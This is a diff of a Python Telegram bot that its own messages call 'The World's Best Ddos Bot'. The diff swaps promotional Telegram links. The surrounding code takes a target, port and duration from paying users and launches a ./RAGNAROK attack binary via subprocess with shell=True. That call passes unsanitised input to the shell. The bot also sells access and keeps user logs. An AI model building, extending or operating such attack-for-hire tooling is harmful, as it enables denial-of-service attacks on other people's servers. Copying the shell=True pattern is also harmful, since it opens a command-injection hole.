@@ -208,7 +208,7 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"{username}, \n✨✨Premium \nAttack1 STARTED 🚀 BY HELLA.\n\n📡 𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n🔌 𝐏𝐨𝐫𝐭: {port}\n⏱️ 𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n\n𝐌𝐞𝐭𝐡𝐨𝐝: Premium \nBy https://t.me/DroiDAssets"
+    response = f"{username}, \n✨✨Premium \nAttack1 STARTED 🚀 BY HELLA.\n\n📡 𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n🔌 𝐏𝐨𝐫𝐭: {port}\n⏱️ 𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n\n𝐌𝐞𝐭𝐡𝐨𝐝: Premium \nBy https://t.me/+GnZrPlzQvFYwZjg1"
     bot.reply_to(message, response)
 
 # Dictionary to store the last time each user ran the /attack1 command
@@ -247,9 +247,9 @@ def handle_bgmi(message):
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                 full_command = f"./RAGNAROK {target} {port} {time}"
                 subprocess.run(full_command, shell=True)
-                response = f"RAGNAROK 🚀\nAttack1 Finished. \n📡 Target: {target} \n🔌 Port: {port} \n⏱️ Time: {time} \n BY https://t.me/DroiDAssets"
+                response = f"RAGNAROK 🚀\nAttack1 Finished. \n📡 Target: {target} \n🔌 Port: {port} \n⏱️ Time: {time} \n BY https://t.me/+GnZrPlzQvFYwZjg1"
         else:
-            response = "Usage :- /attack1 <target> <port> <time>\nBy https://t.me/DroiDAssets"  # Updated command syntax
+            response = "Usage :- /attack1 <target> <port> <time>\nBy https://t.me/+GnZrPlzQvFYwZjg1"  # Updated command syntax
     else:
         response = "You Are Not User's To Authorized To Use This Command.\nBy STORM BOT DM TO GET ACCESS @RAGNAROKCRACKER"
 
@@ -303,7 +303,7 @@ def show_help(message):
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
-    response = f"Welcome to Your Home, {user_name}! Feel Free to Explore.\nTry To Run This Command : /help\nWelcome To The World's Best Ddos Bot\nBy https://t.me/DroiDAssets"
+    response = f"Welcome to Your Home, {user_name}! Feel Free to Explore.\nTry To Run This Command : /help\nWelcome To The World's Best Ddos Bot\nBy https://t.me/+GnZrPlzQvFYwZjg1"
     bot.reply_to(message, response)
 
 
@@ -350,7 +350,7 @@ def welcome_plan(message):
 /logs : All Users Logs.
 /broadcast : Broadcast a Message.
 /clearlogs : Clear The Logs File.
-By https://t.me/DroiDAssets
+By https://t.me/+GnZrPlzQvFYwZjg1
 '''
     bot.reply_to(message, response)
 
